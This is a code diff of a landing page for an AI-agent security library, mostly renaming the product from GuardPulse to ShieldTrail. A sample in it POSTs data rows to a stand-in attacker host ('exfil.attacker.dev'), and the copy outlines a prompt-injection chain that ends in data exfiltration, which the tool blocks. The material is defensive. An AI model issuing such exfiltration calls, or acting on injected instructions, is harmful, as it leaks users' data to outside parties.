@@ -8,7 +8,7 @@ const S = ({ children }: { children: React.ReactNode }) => <span className="c-st
 const F = ({ children }: { children: React.ReactNode }) => <span className="c-fn">{children}</span>;
 const C = ({ children }: { children: React.ReactNode }) => <span className="c-com">{children}</span>;
 
-const NODE_RAW = `import { createGuard, Baseline } from 'guardpulse';
+const NODE_RAW = `import { createGuard, Baseline } from 'shieldtrail';
 
 const baseline = new Baseline();               // Security Autopilot
 const guard = createGuard({
@@ -31,7 +31,7 @@ await trace.fetch('https://exfil.attacker.dev', { method: 'POST', body: rows });
 console.log((await trace.chain()).narrative);`;
 
 const MCP_RAW = `import { Client } from '@modelcontextprotocol/sdk/client/index.js';
-import { guardMcpClient } from 'guardpulse';
+import { guardMcpClient } from 'shieldtrail';
 
 const client = new Client({ name: 'agent', version: '1.0.0' });
 await client.connect(transport);
@@ -42,13 +42,13 @@ await mcp.listTools();     // tool description changed? → drift.tool_definitio
 await mcp.callTool({ name: 'db.query', arguments: { sql } });`;
 
 const NEXT_RAW = `// app/api/agent/route.ts
-import { createGuard, collectorExporter, GuardBlockedError } from 'guardpulse';
+import { createGuard, collectorExporter, GuardBlockedError } from 'shieldtrail';
 import { trace as otel } from '@opentelemetry/api';
 
 const guard = createGuard({
   mode: 'enforce',
   otel,                                         // reuse the active OTel trace id
-  exporters: [collectorExporter(process.env.GUARDPULSE_COLLECTOR!)],
+  exporters: [collectorExporter(process.env.SHIELDTRAIL_COLLECTOR!)],
 });
 
 export async function POST(req: Request) {
@@ -64,8 +64,8 @@ export async function POST(req: Request) {
 
 const REPLAY_RAW = `# 1. record in shadow mode, export events
 # 2. before the release, replay them through the new policy
-npx guardpulse report events.jsonl
-npx guardpulse replay events.jsonl --policy policy.next.json
+npx shieldtrail report events.jsonl
+npx shieldtrail replay events.jsonl --policy policy.next.json
 #   + STOP  http https://api.partner.io/invoices  (alert → block, rule no-unknown-egress)
 #   exit 1 → the new rule would break real traffic`;
 
@@ -85,7 +85,7 @@ export default function Home() {
               See the <span className="grad">whole attack chain</span>,<br />not just the alert
             </h1>
             <p className="lead">
-              GuardPulse lives inside your Node.js / Next.js app, links prompt injection, MCP tool calls and outbound requests into
+              ShieldTrail lives inside your Node.js / Next.js app, links prompt injection, MCP tool calls and outbound requests into
               one graph, and stops the step that matters — <a href="#autopilot">in shadow mode first</a>, so production never breaks on a
               false positive.
             </p>
@@ -102,10 +102,10 @@ export default function Home() {
                 <i /> <i /> <i /> <span>install</span>
               </div>
               <pre>
-                <span className="c-prompt">$</span> npm install guardpulse{'\n'}
-                <span className="c-prompt">$</span> npx guardpulse collector --port 4319 <C># events → dashboard</C>
+                <span className="c-prompt">$</span> npm install shieldtrail{'\n'}
+                <span className="c-prompt">$</span> npx shieldtrail collector --port 4319 <C># events → dashboard</C>
                 {'\n'}
-                <span className="c-prompt">$</span> npx guardpulse replay events.jsonl --policy next.json <C># gate a release</C>
+                <span className="c-prompt">$</span> npx shieldtrail replay events.jsonl --policy next.json <C># gate a release</C>
               </pre>
             </div>
           </div>
@@ -116,7 +116,7 @@ export default function Home() {
             <div className="eyebrow">01 · Attack Chain Intelligence</div>
             <h2>Four signals. One story.</h2>
             <p className="sub">
-              Each of these is a separate log line in a normal stack. GuardPulse keeps per-trace state — what entered, what the agent
+              Each of these is a separate log line in a normal stack. ShieldTrail keeps per-trace state — what entered, what the agent
               touched, where data is heading — so the fourth step is judged in the light of the first.
             </p>
             <div className="chain-strip">
@@ -140,7 +140,7 @@ export default function Home() {
               </div>
               <div className="chain-step">
                 <div className="num">STEP 4</div>
-                <h3>GuardPulse: BLOCK</h3>
+                <h3>ShieldTrail: BLOCK</h3>
                 <p>The request never leaves. The whole chain is saved with its reason.</p>
                 <span className="tag tag-block">exfil-after-injection</span>
               </div>
@@ -213,7 +213,7 @@ export default function Home() {
               <div className="card step-card">
                 <div className="n">03</div>
                 <h3>Replay before release</h3>
-                <p><code>guardpulse replay</code> re-runs recorded chains through the new policy and fails the build if real traffic would break.</p>
+                <p><code>shieldtrail replay</code> re-runs recorded chains through the new policy and fails the build if real traffic would break.</p>
               </div>
             </div>
           </div>
@@ -233,7 +233,7 @@ export default function Home() {
                   raw: NODE_RAW,
                   code: (
                     <>
-                      <K>import</K> {'{ createGuard, Baseline }'} <K>from</K> <S>&apos;guardpulse&apos;</S>;{'\n\n'}
+                      <K>import</K> {'{ createGuard, Baseline }'} <K>from</K> <S>&apos;shieldtrail&apos;</S>;{'\n\n'}
                       <K>const</K> baseline = <K>new</K> <F>Baseline</F>(); <C>{'// Security Autopilot'}</C>
                       {'\n'}
                       <K>const</K> guard = <F>createGuard</F>({'{'}
@@ -293,7 +293,7 @@ export default function Home() {
           <div className="container">
             <div className="eyebrow">06 · Where it fits</div>
             <h2>Not another agent firewall</h2>
-            <p className="sub">Great tools already guard the edge. GuardPulse adds what you only see from inside the application.</p>
+            <p className="sub">Great tools already guard the edge. ShieldTrail adds what you only see from inside the application.</p>
             <div className="table-wrap">
               <table>
                 <thead>
@@ -301,7 +301,7 @@ export default function Home() {
                     <th scope="col"></th>
                     <th scope="col">Egress firewall (e.g. Pipelock)</th>
                     <th scope="col">Trace rule checker (e.g. Invariant)</th>
-                    <th scope="col">GuardPulse</th>
+                    <th scope="col">ShieldTrail</th>
                   </tr>
                 </thead>
                 <tbody>
@@ -335,7 +335,7 @@ export default function Home() {
             <h2>
               Watch an agent get <span className="grad">hijacked</span> — then stopped
             </h2>
-            <p className="sub" style={{ margin: '0 auto 32px' }}>One app, two runs: without GuardPulse and with it. Runs entirely in your browser.</p>
+            <p className="sub" style={{ margin: '0 auto 32px' }}>One app, two runs: without ShieldTrail and with it. Runs entirely in your browser.</p>
             <div className="cta" style={{ marginBottom: 0 }}>
               <Link className="btn btn-primary" href="/demo/">Open the live demo →</Link>
               <Link className="btn btn-ghost" href="/dashboard/">Explore the dashboard</Link>
